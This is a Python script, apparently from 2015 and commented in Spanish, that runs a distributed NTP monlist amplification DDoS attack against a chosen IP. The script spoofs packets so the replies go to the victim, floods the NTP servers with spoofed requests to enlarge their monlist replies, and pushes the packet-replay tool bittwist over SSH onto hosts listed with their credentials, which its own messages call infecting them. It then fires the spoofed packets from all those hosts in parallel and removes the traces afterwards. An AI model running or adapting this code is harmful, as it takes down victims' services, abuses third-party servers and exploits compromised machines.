#!/usr/bin/python
# -*- coding: 850 -*-

# Autor: Luis Vázquez Castaño (2015)

import paramiko, scp, threading, thread, os, sys, subprocess, time, re, socket
from paramiko import SSHClient
from scp import SCPClient


if os.getuid() != 0: # Valida si el script esta siendo ejecutado como root
    print("Debes ejecutar este script como root.")
    sys.exit(0)


## CONFIGURAR ESTOS DOS PARÁMETROS ##

iface_CC = "wlan0"
iface_attacker = "eth0"

#####################################


outlock = threading.Lock()
localIP = ""
target = ""
contador = 0
num_attackers = 0
flag_ntp_infectar = False
flag_new_target = False
flag_force = False
attackers = []
servers = []
threads = []

	
def printhelp():
	print '  AYUDA'
	print ''
	print '  Debe configurarse en el código las interfaces del C&C y de los atacantes antes de ejecutar el script!'
	print ''
	print '  Uso:	ddos-NTP.py <ip> [-n][-f]'
	print '  ip:	IP del objetivo'
	print '  -n:	Enviar 600 ntpdate a cada NTP para amplificar el ataque (lento)'
	print '  -f:	Comenzar ataque automáticamente'
	exit(1)


# Elimina un atacante que haya fallado en su ataque o esté offline
def remove_attacker(attacker):
	global attackers
	global num_attackers
	print 'remove_attacker '+ str(attackers) + '   ' + str(num_attackers)
	for n in attackers:
		if n[0] == attacker:
			attackers.remove(n)
			num_attackers = num_attackers-1


def nuevo_target(servers, target):
	for server in servers:
		print 'Preparando paquete de ataque a través del servidor NTP '+server
		os.chdir(os.getcwd()+'/bittwist-linux-2.0')
		
		# Generamos un paquete modelo con solicitud monlist al servidor NTP
		tcpdump = subprocess.Popen(['sudo -i tcpdump -i '+iface_CC+' -x -n -e -l -w '+os.getcwd()+'/NTP-Attack-Model.pcap -c1 host '+localIP+' and port 123'], stdout=subprocess.PIPE, shell=True)
		time.sleep(1)
		os.system('sudo -i ntpdc -n -c monlist '+server)
		tcpdump.wait()

		# Se cambia la IP por la del sistema víctima
		os.system('sudo bittwiste -I NTP-Attack-Model.pcap -O NTP-Attack-'+server+'.pcap -T ip -s '+target)
		os.system('sudo rm NTP-Attack-Model.pcap')

		# Se comprime el resultado junto con la herramienta para ser introducidos en los sistemas vulnerados
		os.chdir(os.pardir)
		os.system('tar -czf bittwist-linux-2.0.tar.gz bittwist-linux-2.0/')	
		

def ntp_infectar(servers):
	for server in servers:
		print 'Enviando peticiones al servidor NTP '+server

		# Generamos un paquete modelo con solicitud de tiempo al servidor NTP
		tcpdump = subprocess.Popen(['sudo -i tcpdump -i '+iface_CC+' -x -n -e -l -w '+os.getcwd()+'/NTP-Client-Model.pcap -c1 host '+localIP+' and port 123'], stdout=subprocess.PIPE, shell=True)
		time.sleep(1)
		os.system('sudo -i ntpdate -d '+server)
		tcpdump.wait()
	
		# Generamos 600 paquetes con IP falsas y se envían al NTP
		for i in range(1, 60):
			for j in range(1, 10):
				if os.path.isfile('NTP-Client-'+server+'.pcap'):
					os.system('sudo rm NTP-Client-'+server+'.pcap')
				os.system('sudo bittwiste -I NTP-Client-Model.pcap -O NTP-Client-'+server+'.pcap -T ip -s 10.0.'+str(j)+'.'+str(i))
				os.system('sudo bittwist -i '+iface_attacker+' NTP-Client-'+server+'.pcap -l 1')	
		
		os.system('sudo rm NTP-Client-Model.pcap')	
	

# Reparte los servidores NTP mediante round-robin
def get_server(servers):
	global contador
	server = servers[contador]
	if contador >= len(servers)-1:
		contador = 0
	else:
		contador = contador+1 
	return server
	

# Accede al atacante e instala, desinstala o elimina los ficheros de Bittwist
def sshAttacker(host, user, passwd, comando):
	if comando == 'instalar':
		execute = 'tar xzf bittwist-linux-2.0.tar.gz && rm bittwist-linux-2.0.tar.gz && cd bittwist-linux-2.0/ && sudo make install'
	elif comando == 'desinstalar':
		execute = 'cd bittwist-linux-2.0/ && sudo make uninstall'
	elif comando == 'eliminar':
		execute = 'rm -rf bittwist-linux-2.0/ && sudo pkill bittwist'

	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(host, username=user, password=passwd)
	
	if comando == '':
		ssh.close()
		return

	if comando == 'instalar':
		scp = SCPClient(ssh.get_transport())	
		scp.put('./bittwist-linux-2.0.tar.gz', '~/')
		scp.close()

	transport = ssh.get_transport()
	session = transport.open_session()
	session.set_combine_stderr(True)
	session.get_pty()
	session.exec_command(execute)
	stdin = session.makefile('wb', -1)
	stdout = session.makefile('rb', -1)
	stdin.write(passwd + '\n')
	stdin.flush()

	if comando == 'instalar':
		for n in stdout.read().splitlines():
			print host +'----'+ n

	ssh.close()

	if comando == 'instalar':
		print 'Intalado Bittwist en '+host		
	elif comando == 'desinstalar':
		print 'Software desinstalado del host '+host
	elif comando == 'eliminar':
		print 'Directorio y proceso eliminados del host '+host
	

# Accede al atacante y ejecuta Bittwist
def ejecutarBittwist(servers, host, user, passwd):
	with outlock:	
	
		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		try:
			ssh.connect(host, username=user, password=passwd)
		except Exception, e:
			print 'El host '+host+' no está disponible.'	
			return
		transport = ssh.get_transport()
		session = transport.open_session()
		session.set_combine_stderr(True)
		session.get_pty()
		session.exec_command('cd bittwist-linux-2.0/; sudo bittwist -i '+iface_attacker+' NTP-Attack-'+get_server(servers)+'.pcap -l 0')
		stdin = session.makefile('wb', -1)
		stdout = session.makefile('rb', -1)	
		stdin.write(passwd + '\n')
		stdin.flush()
	
	print 'Atacando desde '+host+'...'
	
	# No se seguirá ejecutando este código hasta que no termine bittwist (nunca, si no hay error)
	for n in stdout.read().splitlines():
		print host + '**********' +n
	remove_attacker(host)
	print 'El host ' +host+ ' ha parado su ataque. Queda(n) '+str(num_attackers)+' atacante(s).'


# Comprueba peroódicamente si los atacantes siguen activos
def ssh_test():
	time.sleep(10)
	while True:
		global attackers
		for n in attackers:				
			ssh = paramiko.SSHClient()
			ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			try:
				ssh.connect(n[0], username=n[1], password=n[2], timeout=10)
			except Exception, e:
				remove_attacker(n[0])
				print 'Se ha perdido la conexión con el host '+n[0]+'. Queda(n) '+str(num_attackers)+' atacante(s).'
			finally:
				ssh.close()
		if num_attackers == 0:
			print '¡No quedan atacantes disponibles! Ataque cancelado.'
			os._exit(3)
		time.sleep(5)


# Elimina completamente el software introducido en los atacantes
def limpiar(attackers):
	for n in attackers:
		try:
			sshAttacker(n[0], n[1], n[2], 'desinstalar')
			sshAttacker(n[0], n[1], n[2], 'eliminar')
		except Exception, e:
			print 'Hubo un error al desinfectar el host '+n[0]
			continue
	print 'Ataque finalizado.'
	os._exit(4)


# Queda a la espera de pulsar Intro para parar el ataque
def keyboard_listener():
	while True:
		key = sys.stdin.read(1)
		if key == '\n':
			global attackers
			print attackers
			print 'Parando ataque. Limpiando atacantes...'
			limpiar(attackers)
		

# Gestor de threads 
def atacar(servers, attackers):
	for a in attackers:
		t = threading.Thread(target=ejecutarBittwist, args=(servers, a[0], a[1], a[2]))
		t.start()
		threads.append(t)
	t2 = threading.Thread(target=ssh_test, args=())
	t2.start()
	threads.append(t2)
	t3 = threading.Thread(target=keyboard_listener, args=())
	t3.start()
	threads.append(t3)

	for t in threads:	
		t.join()   	


# Leemos el fichero de atacantes para obtener los servidores NTP y de los hosts: IP, login y password
servers_txt = open('./ntp_servers.txt', 'r').read().splitlines()
for n in servers_txt:
	if n[0]!='#':
		servers.append(n)
attackers_txt = open('./attackers.txt', 'r').read().splitlines()
for n in attackers_txt:
	if n[0]!='#':
		i = n.split(", ")
		attackers.append(i)
num_attackers = len(attackers)


# Para detectar la IP de la máquina local
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((attackers[0][0],80))
localIP = s.getsockname()[0]
s.close()


# User Inteface
if len(sys.argv) > 4:
	printhelp()
elif len(sys.argv) > 1:
	for n in sys.argv:
		if n == '-n':
			flag_ntp_infectar = True
		elif n == '-f':
			flag_force = True	
		elif re.match("^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"	, n):
			target = n
			flag_new_target = True
		elif n != 'ddos-NTP.py':
			printhelp() 
else:
	print 'No se han introducido parámetros. Se repetirá el último ataque realizado.'

if flag_new_target == True:
	print 'Se atacará a la IP ' + target
	nuevo_target(servers, target)

if flag_ntp_infectar == True:
	print("Se realizarán 600 peticiones ntpdate a cada servidor para aumentar la respuesta a 'monlist'")
	ntp_infectar(servers)


# Se establece una primera conexión con todas las máquinas atacadas para instalar bittwist
attackers_online = []
for n in attackers:
	try:
		sshAttacker(n[0], n[1], n[2], 'instalar')
		attackers_online.append(n)	
	except Exception, e:
		remove_attacker(n[0])
		print 'Error al infectar el host '+n[0]+'. '+str(num_attackers)+' atacante(s) disponibles.'
		if (num_attackers == 0):
			print '¡No quedan atacantes disponibles! Ataque cancelado.'
			sys.exit(2)
		else:
			continue
attackers = attackers_online	

# Atacar con todos los sistemas infectados en paralelo
if flag_force == False:
	raw_input('Pulse intro para atacar:')
print 'Pulse Intro de nuevo para parar el ataque.'

atacar(servers, attackers)
